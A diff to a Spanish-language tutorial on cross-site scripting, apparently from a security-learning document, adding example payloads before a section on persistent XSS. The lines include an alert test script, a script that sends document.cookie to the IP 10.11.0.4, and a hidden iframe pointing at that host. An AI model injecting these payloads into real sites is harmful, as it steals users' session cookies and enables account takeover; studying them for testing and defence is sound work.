@@ -22,7 +22,9 @@ bien sea este la típica cajita con el icono de la lupa para búsqueda de palabr
 
 ```
 Ejemplo:
+    * <script>alert(‘XSS’)</script>
     * <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+    * <iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
 ```
 
 # Cross Site Scripting persistente
